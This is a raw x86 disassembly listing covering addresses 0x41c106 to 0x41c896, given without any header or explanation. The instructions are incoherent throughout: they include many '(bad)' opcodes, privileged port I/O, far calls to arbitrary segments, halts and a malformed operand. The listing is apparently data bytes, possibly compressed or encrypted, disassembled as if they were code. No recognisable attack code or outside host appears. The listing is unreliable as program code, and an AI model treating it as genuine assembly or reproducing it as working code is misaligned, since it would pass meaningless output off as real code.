  41c106:	sbb    bl,BYTE PTR [ecx+0x1]
  41c109:	das    
  41c10a:	mov    ebx,0x23be506f
  41c10f:	xor    ch,ch
  41c111:	mov    ds:0x6c9e0a34,eax
  41c116:	aaa    
  41c117:	out    dx,eax
  41c118:	in     al,0xdb
  41c11a:	xor    DWORD PTR [ebx-0x18aea021],eax
  41c120:	lods   al,BYTE PTR ds:[esi]
  41c121:	inc    esi
  41c122:	pop    esi
  41c123:	inc    esi
  41c124:	xchg   DWORD PTR [ebx+0x61],edx
  41c127:	mov    eax,ds:0x4b324524
  41c12c:	push   0x42
  41c12e:	(bad)  
  41c12f:	push   ds
  41c130:	jl     0x41c154
  41c132:	xor    DWORD PTR ds:0x5a94164d,edi
  41c138:	loopne 0x41c18d
  41c13a:	cdq    
  41c13b:	and    dl,BYTE PTR [ebx]
  41c13d:	xlat   BYTE PTR ds:[ebx]
  41c13e:	mov    esp,0xf176547e
  41c143:	out    dx,al
  41c144:	xchg   edx,eax
  41c145:	mov    eax,0x2b742af0
  41c14a:	inc    edx
  41c14b:	dec    esi
  41c14c:	add    BYTE PTR [ecx-0x67af431b],dl
  41c152:	xchg   ecx,eax
  41c153:	mov    ebx,0x9ef2c16d
  41c158:	pop    ebp
  41c159:	pusha  
  41c15a:	out    0xa1,al
  41c15c:	sbb    eax,0x454e91dc
  41c161:	sub    DWORD PTR [edx],eax
  41c163:	and    DWORD PTR [edi-0x1dccafdc],0x62
  41c16a:	aam    0x53
  41c16c:	cmp    DWORD PTR [esi],0x7c0c86e
  41c172:	adc    eax,0x8234e079
  41c177:	xor    al,0x35
  41c179:	inc    edi
  41c17a:	call   DWORD PTR [edx+0x34]
  41c17d:	aaa    
  41c17e:	in     al,dx
  41c17f:	nop
  41c180:	add    al,0x33
  41c182:	adc    ebx,DWORD PTR [ebp+ebx*1+0x49]
  41c186:	pusha  
  41c187:	idiv   edi
  41c189:	imul   ecx,DWORD PTR [ebx+0x76],0xffffffe6
  41c18d:	or     dh,BYTE PTR [edx+esi*1+0x51b80870]
  41c194:	xchg   ebx,eax
  41c195:	out    dx,eax
  41c196:	fdivr  QWORD PTR [ebx-0x60]
  41c199:	pop    ebx
  41c19a:	dec    eax
  41c19b:	daa    
  41c19c:	repz lea edi,[eax+0x42]
  41c1a0:	push   edx
  41c1a1:	fcomp  QWORD PTR [edx]
  41c1a3:	mov    esp,esp
  41c1a5:	addr16 push eax
  41c1a7:	cmp    edi,DWORD PTR [edx-0x1b]
  41c1aa:	pop    eax
  41c1ab:	xchg   BYTE PTR [eax],bl
  41c1ad:	les    esp,FWORD PTR [ecx]
  41c1af:	lods   al,BYTE PTR ds:[esi]
  41c1b0:	adc    DWORD PTR [edi+0x2],0x41
  41c1b4:	xchg   esp,eax
  41c1b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1b6:	cs sbb al,0x41
  41c1b9:	test   BYTE PTR [edx-0x7d1ad254],0xd0
  41c1c0:	add    BYTE PTR [ecx+edi*2],0x61
  41c1c4:	shl    DWORD PTR [ebx+0x1f],0xfd
  41c1c8:	rcr    DWORD PTR [esi-0x9],0x2c
  41c1cc:	loopne 0x41c1f1
  41c1ce:	cmp    al,0xb9
  41c1d0:	or     DWORD PTR [ebp+0x27],esi
  41c1d3:	inc    ebx
  41c1d4:	mov    ecx,0x776d3529
  41c1d9:	mov    dh,0x7
  41c1db:	or     al,0xcb
  41c1dd:	je     0x41c254
  41c1df:	cwde   
  41c1e0:	dec    esi
  41c1e1:	aas    
  41c1e2:	cld    
  41c1e3:	fadd   DWORD PTR [ecx-0x60]
  41c1e6:	jecxz  0x41c266
  41c1e8:	mov    ch,0x31
  41c1ea:	lock add ch,ch
  41c1ed:	mov    cl,0xdf
  41c1ef:	xchg   ebx,eax
  41c1f0:	ret    
  41c1f1:	push   eax
  41c1f3:	test   BYTE PTR ds:0x1d1c5453,dl
  41c1f9:	add    esp,DWORD PTR [ecx+0x63]
  41c1fc:	mov    ebp,0x8c04c804
  41c201:	cmp    DWORD PTR [ebx+0x1d],ebp
  41c204:	mov    esi,0xfa07968b
  41c209:	push   edi
  41c20a:	test   DWORD PTR [ebx-0x4b],ebx
  41c20d:	inc    ebx
  41c20e:	jno    0x41c253
  41c210:	xor    eax,0x85e7bb55
  41c215:	adc    al,0xe7
  41c217:	mov    gs,WORD PTR [bx+si]
  41c21a:	mov    eax,0x65e50877
  41c21f:	in     eax,dx
  41c220:	dec    esi
  41c221:	inc    esp
  41c222:	push   esp
  41c223:	sbb    bh,ah
  41c225:	in     al,dx
  41c226:	and    edi,DWORD PTR [ecx+0x3c7c45f5]
  41c22c:	in     al,0xdc
  41c22e:	add    ebx,edx
  41c230:	mov    eax,ds:0x3f6eb70
  41c235:	jle    0x41c26e
  41c237:	mov    edi,DWORD PTR [esi+0x63db1068]
  41c23d:	fdivr  DWORD PTR [esi]
  41c23f:	sbb    BYTE PTR [eax+0x1b],cl
  41c242:	jnp    0x41c29d
  41c244:	xlat   BYTE PTR ds:[ebx]
  41c245:	sahf   
  41c246:	xor    eax,0xb65397f7
  41c24b:	call   0x3615:0x47b0df53
  41c252:	mov    WORD PTR [eax-0x3],fs
  41c255:	inc    ebx
  41c256:	into   
  41c257:	enter  0x2331,0x5b
  41c25b:	sar    DWORD PTR [eax+0x7996cd25],0xc0
  41c262:	shr    DWORD PTR [ebx+ebx*2+0x68],1
  41c266:	test   BYTE PTR [edi],ah
  41c268:	cwde   
  41c269:	sbb    al,0x64
  41c26b:	mov    ch,0x42
  41c26d:	mov    ch,0x68
  41c26f:	je     0x41c28e
  41c271:	dec    esp
  41c272:	cli    
  41c273:	sahf   
  41c274:	hlt    
  41c275:	repz retf 
  41c277:	jb     0x41c2c2
  41c279:	or     edx,0x888e0237
  41c27f:	push   ebx
  41c280:	and    DWORD PTR [edi-0x90ceee6],ebx
  41c286:	cmp    al,0xdf
  41c288:	fwait
  41c289:	rcl    bh,0xd2
  41c28c:	cmp    ebx,DWORD PTR [ebx-0x2dd5a67a]
  41c292:	sub    al,0x1c
  41c294:	hlt    
  41c295:	fst    QWORD PTR [edi-0x4054d4fa]
  41c29b:	mov    ds:0xf2cea52e,al
  41c2a0:	arpl   WORD PTR [ebx],bp
  41c2a2:	idiv   DWORD PTR [esi]
  41c2a4:	adc    DWORD PTR ds:0xe866381f,edx
  41c2aa:	loope  0x41c23d
  41c2ac:	leave  
  41c2ad:	mov    bh,0xdd
  41c2af:	or     eax,0xe657887d
  41c2b4:	jae    0x41c26e
  41c2b6:	daa    
  41c2b7:	nop
  41c2b8:	jle    0x41c281
  41c2ba:	xlat   BYTE PTR ds:[ebx]
  41c2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2bc:	(bad)  
  41c2bd:	icebp  
  41c2be:	cmp    al,0xd5
  41c2c0:	sbb    esp,DWORD PTR [ebx+0x12f88367]
  41c2c6:	int    0x93
  41c2c8:	repnz adc dl,BYTE PTR [edx+0x4e]
  41c2cc:	loop   0x41c34c
  41c2ce:	sbb    esi,DWORD PTR [ebp-0x557c22a7]
  41c2d4:	loope  0x41c25e
  41c2d6:	pop    eax
  41c2d7:	sub    eax,0xbee8bd78
  41c2dc:	and    BYTE PTR [edi-0x74fdb4da],0x40
  41c2e3:	or     BYTE PTR [edi],0x6a
  41c2e6:	xlat   BYTE PTR ds:[ebx]
  41c2e7:	add    DWORD PTR [ebp-0x51],esp
  41c2ea:	fist   DWORD PTR [ecx+0x79]
  41c2ed:	mov    dh,BYTE PTR [edi]
  41c2ef:	ins    DWORD PTR es:[edi],dx
  41c2f0:	in     eax,dx
  41c2f1:	sbb    al,0xe2
  41c2f3:	cs push ss
  41c2f5:	jmp    0x41c303
  41c2f7:	xchg   esp,eax
  41c2f8:	jecxz  0x41c32b
  41c2fa:	(bad)  [edi+0x1d6039d7]
  41c300:	mov    ds:0x87a68401,eax
  41c305:	mov    edx,0x5a0e8f7a
  41c30a:	icebp  
  41c30b:	inc    edx
  41c30c:	mov    eax,ds:0x1473ae00
  41c311:	sub    DWORD PTR [ebp-0x62],0xffffffbe
  41c315:	inc    esp
  41c316:	call   0x6741a5ce
  41c31b:	or     bh,al
  41c31d:	push   ss
  41c31e:	dec    ebx
  41c31f:	popf   
  41c320:	xor    ah,BYTE PTR [edi-0x69f2ed7b]
  41c326:	aad    0x1
  41c328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c329:	or     bl,BYTE PTR [ecx+0x5a]
  41c32c:	fcmovne st,st(6)
  41c32e:	fldcw  WORD PTR [edi]
  41c330:	gs out dx,al
  41c332:	xchg   ebx,eax
  41c333:	push   ds
  41c334:	lds    edi,FWORD PTR [edx-0x4e0b0df6]
  41c33a:	cs xchg edi,eax
  41c33c:	sbb    BYTE PTR [eax-0x3f],0x1f
  41c340:	ins    BYTE PTR es:[edi],dx
  41c341:	xchg   ebx,eax
  41c342:	lock pop esi
  41c344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c345:	stc    
  41c346:	jg     0x41c367
  41c348:	sahf   
  41c349:	push   cs
  41c34a:	cmp    bh,BYTE PTR [bp-0x53]
  41c34e:	out    dx,al
  41c34f:	dec    DWORD PTR [esi+0x4093a447]
  41c355:	adc    BYTE PTR [eax-0xc0b278],al
  41c35b:	mov    ?,WORD PTR [ebx+0x2e19fb90]
  41c361:	xlat   BYTE PTR ds:[ebx]
  41c362:	add    ebp,DWORD PTR [ebp+0x197c2e81]
  41c368:	sti    
  41c369:	inc    ebp
  41c36a:	adc    esi,DWORD PTR [eax]
  41c36c:	cmp    dl,al
  41c36e:	icebp  
  41c36f:	mov    eax,ds:0xaf9e10c8
  41c374:	call   0xba29b4dd
  41c379:	ds push cs
  41c37b:	dec    ebp
  41c37c:	call   0x23c3:0xc5214fd
  41c383:	out    dx,eax
  41c384:	cwde   
  41c385:	jno    0x41c333
  41c387:	and    BYTE PTR [ebp-0x4c4ef298],dh
  41c38d:	es push cs
  41c38f:	mov    fs,WORD PTR [ecx]
  41c391:	cmp    ebx,0x35
  41c394:	es pop eax
  41c396:	int    0x9d
  41c398:	dec    edi
  41c399:	das    
  41c39a:	fs fwait
  41c39c:	shl    ecx,cl
  41c39e:	xchg   esp,eax
  41c39f:	fsubrp st(2),st
  41c3a1:	and    al,0x1e
  41c3a3:	jns    0x41c3c3
  41c3a5:	or     esi,DWORD PTR [edx-0x2e9b9a23]
  41c3ab:	cmp    BYTE PTR [edx],dl
  41c3ad:	cli    
  41c3ae:	sub    ah,BYTE PTR [esi]
  41c3b0:	or     eax,ebp
  41c3b2:	or     cl,BYTE PTR [eax]
  41c3b4:	xchg   edx,eax
  41c3b5:	mov    WORD PTR [edx],ss
  41c3b7:	sub    BYTE PTR [edi],ah
  41c3b9:	xchg   edi,eax
  41c3ba:	mov    ecx,0x8f026800
  41c3bf:	xchg   esi,eax
  41c3c0:	jae    0x41c419
  41c3c2:	ds retf 
  41c3c4:	gs std 
  41c3c6:	std    
  41c3c7:	in     al,0xba
  41c3c9:	ret    
  41c3ca:	push   0xffffff8e
  41c3cc:	aam    0x39
  41c3ce:	popa   
  41c3cf:	push   0x6e
  41c3d1:	stc    
  41c3d2:	mov    edx,eax
  41c3d4:	mov    al,ds:0x9f897cd0
  41c3d9:	aam    0x9f
  41c3db:	jmp    0x2ddb906b
  41c3e0:	lahf   
  41c3e1:	xchg   edi,eax
  41c3e2:	out    dx,al
  41c3e3:	dec    edx
  41c3e4:	in     al,dx
  41c3e5:	test   eax,0x12c3f6d6
  41c3ea:	xor    al,0x1e
  41c3ec:	fdivr  DWORD PTR [edx-0x46]
  41c3ef:	es mov cl,0x69
  41c3f2:	sti    
  41c3f3:	loope  0x41c456
  41c3f5:	call   0xf88abb95
  41c3fa:	std    
  41c3fb:	ds call 0xf062:0x49ca0f6
  41c403:	(bad)  
  41c404:	dec    ebp
  41c405:	repz push esp
  41c407:	out    0xf7,eax
  41c409:	fbstp  TBYTE PTR [eax+0x2c4a6986]
  41c40f:	cmp    BYTE PTR [ebp+ebx*4+0x3],cl
  41c413:	(bad)  
  41c414:	jp     0x41c3fa
  41c416:	out    dx,eax
  41c417:	push   es
  41c418:	ret    0x223c
  41c41b:	jne    0x41c40d
  41c41d:	outs   dx,BYTE PTR ds:[esi]
  41c41e:	addr16 jno 0x41c41d
  41c421:	retf   0x4682
  41c424:	jmp    0xb7d6:0x73e4ab0a
  41c42b:	pop    ss
  41c42c:	call   0x65d4:0x2468eaae
  41c433:	ins    BYTE PTR es:[edi],dx
  41c434:	mov    ebx,ebp
  41c436:	pushf  
  41c437:	mov    cl,0xee
  41c439:	push   eax
  41c43a:	fstp   TBYTE PTR [ebx+edi*4]
  41c43d:	sbb    ecx,edi
  41c43f:	ret    
  41c440:	jno    0x41c46c
  41c442:	mov    dl,0xb
  41c444:	mov    dl,BYTE PTR [esi+0x67]
  41c447:	mov    es,WORD PTR ds:0xbf32ca2
  41c44d:	xor    bh,BYTE PTR [ebx]
  41c44f:	test   BYTE PTR [ebx+0x3a],al
  41c452:	and    DWORD PTR [ebx],ecx
  41c454:	test   BYTE PTR [esi],dl
  41c456:	sub    ebp,DWORD PTR [ebx+0x106af58d]
  41c45c:	iret   
  41c45d:	xchg   ebx,eax
  41c45e:	push   ebx
  41c45f:	dec    esp
  41c460:	mov    ebx,0xda1bb55e
  41c465:	jg     0x41c423
  41c467:	mov    ah,0xf2
  41c469:	cmc    
  41c46a:	or     ecx,DWORD PTR [ebx+0x49]
  41c46d:	pusha  
  41c46e:	sbb    al,0x44
  41c470:	into   
  41c471:	adc    eax,0x26b01eb6
  41c476:	in     al,dx
  41c477:	xor    DWORD PTR [ebx],0xce209e2e
  41c47d:	std    
  41c47e:	xor    eax,0x4facbecb
  41c483:	pop    eax
  41c484:	or     ebp,DWORD PTR [bp+si+0x3132]
  41c489:	or     DWORD PTR [ebp+0x70],esi
  41c48c:	xchg   edx,eax
  41c48d:	aaa    
  41c48e:	push   ds
  41c48f:	mov    bh,0xf0
  41c491:	or     al,0x99
  41c493:	add    ecx,DWORD PTR [edi-0x80]
  41c496:	sbb    ecx,DWORD PTR [edx+0x3c5c0bae]
  41c49c:	sbb    esp,eax
  41c49e:	shl    esp,cl
  41c4a0:	(bad)  
  41c4a1:	fdivr  QWORD PTR ds:0x4b8fb1bd
  41c4a7:	cs jns 0x41c469
  41c4aa:	dec    edi
  41c4ab:	lods   ax,WORD PTR ds:[esi]
  41c4ad:	jle    0x41c4c3
  41c4af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4b0:	in     eax,0xde
  41c4b2:	push   esp
  41c4b3:	lods   eax,DWORD PTR ds:[esi]
  41c4b4:	in     al,dx
  41c4b5:	jo     0x41c466
  41c4b7:	loopne 0x41c510
  41c4b9:	les    eax,FWORD PTR [edx]
  41c4bb:	fisttp DWORD PTR [edi-0x4e]
  41c4be:	adc    eax,0xeda8d96b
  41c4c3:	mov    dl,BYTE PTR ss:[esi-0x57]
  41c4c7:	icebp  
  41c4c8:	pop    esi
  41c4c9:	cmp    al,0xe6
  41c4cb:	push   ecx
  41c4cc:	xlat   BYTE PTR ds:[ebx]
  41c4cd:	jl     0x41c52b
  41c4cf:	call   0x1feb:0x3df27514
  41c4d6:	or     esi,DWORD PTR [esp+eax*2]
  41c4d9:	jmp    0x8f33:0xa767b0d2
  41c4e0:	mov    ds:0xdbe031a0,eax
  41c4e5:	fcom   st(1)
  41c4e7:	mov    eax,ds:0xb0d9fe57
  41c4ec:	xor    DWORD PTR [esi+0x13],ebx
  41c4ef:	sub    DWORD PTR [edx],ecx
  41c4f1:	or     al,0x80
  41c4f3:	aaa    
  41c4f4:	es cmp al,0x72
  41c4f7:	(bad)  
  41c4f8:	sbb    bh,cl
  41c4fa:	pop    edi
  41c4fb:	repnz aas 
  41c4fd:	or     ecx,eax
  41c4ff:	and    dh,BYTE PTR [ecx+0x6882e8ac]
  41c505:	stos   DWORD PTR es:[edi],eax
  41c506:	adc    eax,0x1483bfac
  41c50b:	add    dh,BYTE PTR [ecx+0x70]
  41c50e:	jle    0x41c50a
  41c510:	add    esp,DWORD PTR [esi+0xbd4cc5e]
  41c516:	pusha  
  41c517:	imul   ebx,DWORD PTR [esi+0x3d8aabff],0x4c41f3b4
  41c521:	ins    BYTE PTR es:[edi],dx
  41c522:	jnp    0x41c51f
  41c524:	jbe    0x41c55d
  41c526:	cmp    eax,0xf80a0506
  41c52b:	xor    bh,bl
  41c52d:	pop    esi
  41c52e:	shl    BYTE PTR [ebx],cl
  41c530:	call   0xe9920ed8
  41c535:	iret   
  41c536:	retf   0x3c54
  41c539:	sbb    eax,0xdab2f244
  41c53e:	add    bl,BYTE PTR [edx]
  41c540:	les    ecx,FWORD PTR [edx+ebx*1-0x4f450b49]
  41c547:	and    BYTE PTR [esp+eax*2-0x25262f3e],bl
  41c54e:	dec    ecx
  41c54f:	stos   DWORD PTR es:[edi],eax
  41c550:	xlat   BYTE PTR ds:[ebx]
  41c551:	(bad)  
  41c552:	call   0x773fe3e4
  41c557:	inc    eax
  41c558:	out    0x8e,eax
  41c55a:	loope  0x41c570
  41c55c:	(bad)  
  41c55e:	jl     0x41c581
  41c560:	sti    
  41c561:	ds imul ecx,edi,0xffffff99
  41c565:	cmp    DWORD PTR [eax-0x4a0198b7],ebp
  41c56b:	xchg   ebp,eax
  41c56c:	fcomp  st(7)
  41c56e:	sahf   
  41c56f:	retf   0x3d37
  41c572:	xchg   esi,eax
  41c573:	retf   0x218d
  41c576:	jl     0x41c551
  41c578:	xor    eax,0x95818ed3
  41c57d:	retf   
  41c57e:	add    DWORD PTR [esi+0x6aa2a83],esp
  41c584:	sbb    BYTE PTR [edx-0x3b],ch
  41c587:	dec    eax
  41c588:	and    al,0xea
  41c58a:	jmp    0x26be07b7
  41c58f:	pop    eax
  41c590:	mov    BYTE PTR [edi+edx*2+0x3dcf979e],dh
  41c597:	sbb    al,0xd3
  41c599:	fstp   DWORD PTR [esi]
  41c59b:	in     eax,0x48
  41c59d:	ins    BYTE PTR es:[edi],dx
  41c59e:	xor    al,ah
  41c5a0:	loopne 0x41c5dd
  41c5a2:	push   edx
  41c5a3:	fadd   QWORD PTR [ecx+ebx*8+0x3e445073]
  41c5aa:	jp     0x41c585
  41c5ac:	jg     0x41c54b
  41c5ae:	adc    dl,dl
  41c5b0:	mov    ah,0x14
  41c5b2:	adc    BYTE PTR [eax],bl
  41c5b4:	jmp    0x9c8089a8
  41c5b9:	in     al,0x9a
  41c5bb:	ins    DWORD PTR es:[edi],dx
  41c5bc:	xor    cl,BYTE PTR [ecx-0x1538edf8]
  41c5c2:	mov    ah,0xf7
  41c5c4:	in     al,0x1d
  41c5c6:	dec    ecx
  41c5c7:	push   es
  41c5c8:	arpl   WORD PTR [edx+edx*8],si
  41c5cb:	ds shr bh,1
  41c5ce:	xchg   ecx,eax
  41c5cf:	mov    cl,BYTE PTR [ebx+0x5e]
  41c5d2:	adc    BYTE PTR [esp+eax*1],ch
  41c5d5:	or     al,0x9e
  41c5d7:	iret   
  41c5d8:	or     eax,0xaf5ac811
  41c5dd:	ins    DWORD PTR es:[edi],dx
  41c5de:	mov    fs,edi
  41c5e0:	jne    0x41c5a0
  41c5e2:	loope  0x41c5f1
  41c5e4:	sub    eax,0x503f4ddd
  41c5e9:	popf   
  41c5ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5eb:	dec    ecx
  41c5ec:	mov    ebp,0x69bbe3c0
  41c5f1:	ss jno 0x41c65c
  41c5f4:	xor    ch,BYTE PTR [eax+0x7e949d4f]
  41c5fa:	adc    eax,0x8131b5f7
  41c5ff:	push   edi
  41c600:	xor    eax,ecx
  41c602:	loop   0x41c5dd
  41c604:	inc    ebx
  41c605:	xchg   edi,eax
  41c606:	push   edx
  41c607:	jle    0x41c653
  41c609:	or     DWORD PTR [edi+0x9],0xffffffd0
  41c60d:	jno    0x41c59b
  41c60f:	ret    
  41c610:	test   DWORD PTR [ebp-0x13],ebx
  41c613:	retf   0xc82b
  41c616:	mov    ebp,0x584e7247
  41c61b:	lods   eax,DWORD PTR ds:[esi]
  41c61c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c61d:	cli    
  41c61e:	arpl   WORD PTR [ebx+0x6d],cx
  41c621:	or     eax,0xed29cb8a
  41c626:	mov    cl,0x5c
  41c628:	shl    BYTE PTR [ebx+eax*4],1
  41c62b:	loop   0x41c605
  41c62d:	ss inc ecx
  41c62f:	rcr    BYTE PTR [esi+ebx*8+0x11],0xe0
  41c634:	int3   
  41c635:	loopne 0x41c68b
  41c637:	inc    ebx
  41c638:	mov    cl,0xab
  41c63a:	mov    edx,0xcfe499c0
  41c63f:	outs   dx,DWORD PTR ds:[esi]
  41c640:	mov    eax,ds:0x5379e860
  41c645:	sar    BYTE PTR [ebp-0x14],0xe
  41c649:	xchg   ebx,eax
  41c64a:	xor    DWORD PTR ds:0x980de828,ecx
  41c650:	mov    ebp,0x92d5c9df
  41c655:	mov    ch,al
  41c657:	(bad)  
  41c658:	dec    esp
  41c659:	test   eax,esp
  41c65b:	test   al,0x9
  41c65d:	ins    BYTE PTR es:[edi],dx
  41c65e:	dec    esp
  41c65f:	dec    ebx
  41c660:	jae    0x41c60d
  41c662:	pop    es
  41c663:	cmp    al,BYTE PTR [ebp+0xf829fd3]
  41c669:	and    al,0x52
  41c66b:	pop    esi
  41c66c:	mov    ebp,0x48c767b7
  41c671:	jmp    0x41c65d
  41c673:	popa   
  41c674:	jecxz  0x41c615
  41c676:	sahf   
  41c677:	sbb    DWORD PTR [edi],eax
  41c679:	jecxz  0x41c67b
  41c67b:	dec    esp
  41c67c:	clc    
  41c67d:	(bad)  
  41c67e:	cmp    eax,0x60d3c2ce
  41c683:	sbb    eax,DWORD PTR [ecx]
  41c685:	inc    ecx
  41c686:	mov    al,0xc9
  41c688:	add    BYTE PTR [ecx],bh
  41c68a:	add    ebp,DWORD PTR [ecx+0x36491958]
  41c690:	(bad)  
  41c691:	popf   
  41c692:	cli    
  41c693:	push   ecx
  41c694:	test   BYTE PTR [ecx],dl
  41c696:	add    BYTE PTR [esi+0x630b815],dh
  41c69c:	ret    
  41c69d:	fmul   st,st(7)
  41c69f:	sbb    ch,bl
  41c6a1:	ja     0x41c6bc
  41c6a3:	sub    eax,0x95a16a91
  41c6a8:	push   esp
  41c6a9:	jnp    0x41c634
  41c6ab:	xor    DWORD PTR [eax-0x3f0b64b5],ebx
  41c6b1:	pop    ds
  41c6b2:	leave  
  41c6b3:	aad    0xc8
  41c6b5:	int3   
  41c6b6:	sbb    ch,BYTE PTR [edx]
  41c6b8:	rcl    DWORD PTR [ebp-0x74],0xb1
  41c6bc:	hlt    
  41c6bd:	hlt    
  41c6be:	mov    ds:0xe782c1b,al
  41c6c3:	sbb    esi,ebp
  41c6c5:	adc    ebp,DWORD PTR [ecx]
  41c6c7:	and    bh,BYTE PTR [esi+0x3e]
  41c6ca:	mov    ebx,DWORD PTR [ecx*1-0x6c55c8a6]
  41c6d1:	call   0x7a91:0x8de36c59
  41c6d8:	adc    eax,0xea645276
  41c6dd:	mov    ds:0x5d52cdb5,al
  41c6e2:	add    eax,DWORD PTR [edi+0x1330bd4d]
  41c6e8:	jle    0x41c6ae
  41c6ea:	test   esp,eax
  41c6ec:	scas   al,BYTE PTR es:[di]
  41c6ee:	imul   edx,DWORD PTR [edx],0x71d4e8fe
  41c6f4:	imul   esp,DWORD PTR [eax-0x1d],0x10
  41c6f8:	dec    esp
  41c6f9:	jbe    0x41c70c
  41c6fb:	jg     0x41c6de
  41c6fd:	loope  0x41c72a
  41c6ff:	dec    ebx
  41c700:	sbb    eax,0xe39d7d41
  41c705:	xchg   edi,eax
  41c706:	jbe    0x41c6dd
  41c708:	and    eax,0x3c3cf24a
  41c70d:	shl    DWORD PTR [eax],1
  41c70f:	sbb    bl,BYTE PTR [ebp+0x11]
  41c712:	add    al,0x4d
  41c714:	ins    DWORD PTR es:[edi],dx
  41c715:	rcr    BYTE PTR [ebx+0x5ced911f],0xab
  41c71c:	jb     0x41c6a1
  41c71e:	(bad)  
  41c71f:	add    cl,BYTE PTR gs:[esi+0x6f]
  41c723:	xchg   DWORD PTR [esi-0x4f800589],ebp
  41c729:	mov    ebx,DWORD PTR [ebx]
  41c72b:	ret    0xe99e
  41c72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c72f:	xchg   esi,eax
  41c730:	out    0xf4,al
  41c732:	loope  0x41c755
  41c734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c735:	repnz and DWORD PTR [edi],esp
  41c738:	idiv   BYTE PTR ss:[edi]
  41c73b:	push   0xffffffed
  41c73d:	mov    bh,0xc4
  41c73f:	push   edi
  41c740:	(bad)  
  41c742:	cmp    bl,BYTE PTR [edi+0x3b7d611d]
  41c748:	jle    0x41c6fa
  41c74a:	loop   0x41c719
  41c74c:	inc    edx
  41c74d:	call   0x132d03f3
  41c752:	and    eax,0xc0c1ff48
  41c757:	lods   eax,DWORD PTR ds:[esi]
  41c758:	and    edi,esp
  41c75a:	jmp    0x16df:0xfa131227
  41c761:	adc    dl,BYTE PTR [edx+0x790158b5]
  41c767:	cmp    BYTE PTR [esi-0x18],0x9f
  41c76b:	ror    BYTE PTR [ebx+0x7b77936b],cl
  41c771:	xchg   ebx,eax
  41c772:	mov    cl,0xb2
  41c774:	mov    ss,esi
  41c776:	xor    eax,0x14f52dae
  41c77b:	sub    al,0x8e
  41c77d:	jbe    0x41c757
  41c77f:	dec    edi
  41c780:	std    
  41c781:	sbb    bh,BYTE PTR [ebp+0x15135ab5]
  41c787:	in     eax,0xd4
  41c789:	cli    
  41c78a:	shl    DWORD PTR [ecx+0x7b],0xf9
  41c78e:	shl    DWORD PTR [esi-0x157f6c41],1
  41c794:	cmp    DWORD PTR [esi+0x27d806f3],ebp
  41c79a:	xor    edi,0x29
  41c79d:	sbb    BYTE PTR [eax+0x813a225],0x8
  41c7a4:	fdiv   QWORD PTR [edx]
  41c7a6:	gs xchg esi,eax
  41c7a8:	test   bl,ch
  41c7aa:	nop
  41c7ab:	cs xchg esi,eax
  41c7ad:	neg    al
  41c7af:	cs push edi
  41c7b1:	test   DWORD PTR [ebp-0x67],eax
  41c7b4:	mov    ebx,0x6b2357dd
  41c7b9:	mov    ebx,edi
  41c7bb:	ror    BYTE PTR [edi],0xbb
  41c7be:	hlt    
  41c7bf:	popa   
  41c7c0:	mov    al,ds:0xfdb572e9
  41c7c5:	and    BYTE PTR [ebx+0x1a],dh
  41c7c8:	mov    edi,DWORD PTR [esi+edi*2-0x505ab5ea]
  41c7cf:	in     eax,0x90
  41c7d1:	rcl    BYTE PTR [ebp-0x51],0x1e
  41c7d5:	std    
  41c7d6:	or     bh,bh
  41c7d8:	retf   0x536c
  41c7db:	push   0xbd9ab068
  41c7e0:	jmp    0x41c7b3
  41c7e2:	or     DWORD PTR [edi-0x4b4e2214],0xc7b09caf
  41c7ec:	cld    
  41c7ed:	in     al,dx
  41c7ee:	and    DWORD PTR [ebp+0x6f],esi
  41c7f1:	jae    0x41c7f3
  41c7f3:	mov    ebp,0x5ad93a49
  41c7f8:	popf   
  41c7f9:	lahf   
  41c7fa:	retf   0x4ed5
  41c7fd:	cmp    ch,BYTE PTR [ebx+0x46]
  41c800:	dec    edi
  41c801:	pusha  
  41c802:	mov    edx,0x75b5d558
  41c807:	test   esp,0x5849bf7
  41c80d:	mov    DWORD PTR [edi+edx*2],ebp
  41c810:	xlat   BYTE PTR ds:[ebx]
  41c811:	inc    ecx
  41c812:	xor    ch,BYTE PTR [edx-0x3b]
  41c815:	outs   dx,BYTE PTR ds:[esi]
  41c816:	xlat   BYTE PTR ds:[ebx]
  41c817:	xchg   ebp,eax
  41c818:	ret    
  41c819:	outs   dx,BYTE PTR ds:[esi]
  41c81a:	xor    BYTE PTR [eax-0x69],ch
  41c81d:	lods   eax,DWORD PTR ds:[esi]
  41c81e:	adc    eax,0xc490245f
  41c823:	cdq    
  41c824:	inc    ecx
  41c825:	nop
  41c826:	repnz imul ebx,DWORD PTR ds:0x4ca8ebda,0x8bba2390
  41c831:	lods   al,BYTE PTR ds:[esi]
  41c832:	test   al,0xa3
  41c834:	mov    al,0x93
  41c836:	leave  
  41c837:	xor    BYTE PTR [ebx-0x26],0xd
  41c83b:	dec    edx
  41c83c:	mov    al,ds:0x52ef7853
  41c841:	in     al,0x2
  41c843:	cmp    DWORD PTR [edi-0x3ed477de],0x44af91a
  41c84d:	cdq    
  41c84e:	repnz nop
  41c850:	repz sub BYTE PTR [ebp-0x6b],0x8
  41c855:	pop    esi
  41c856:	(bad)  
  41c857:	xor    DWORD PTR [eax+0xa5f4f87],edx
  41c85d:	cmc    
  41c85e:	sbb    al,0x78
  41c860:	popf   
  41c861:	adc    eax,0xf1ca79a
  41c866:	mov    ds:0xb67c0859,al
  41c86b:	scas   al,BYTE PTR es:[edi]
  41c86c:	pop    ebp
  41c86d:	popa   
  41c86e:	sub    ebx,DWORD PTR [ecx+0x77]
  41c871:	dec    edi
  41c872:	loop   0x41c832
  41c874:	ret    
  41c875:	out    0x65,eax
  41c877:	test   BYTE PTR [ecx],dl
  41c879:	add    BYTE PTR es:[ecx+0x5e],ch
  41c87d:	push   ebx
  41c87e:	jg     0x41c8fb
  41c880:	clc    
  41c881:	inc    eax
  41c882:	jl     0x41c8ea
  41c884:	popf   
  41c885:	fwait
  41c886:	push   ecx
  41c887:	mov    ecx,0x21358a47
  41c88c:	imul   esp,DWORD PTR [ebp-0x1cfcdfd1],0x108e214e
  41c896:	test   BYTE PTR [ecx+0x25cf93c0],ch
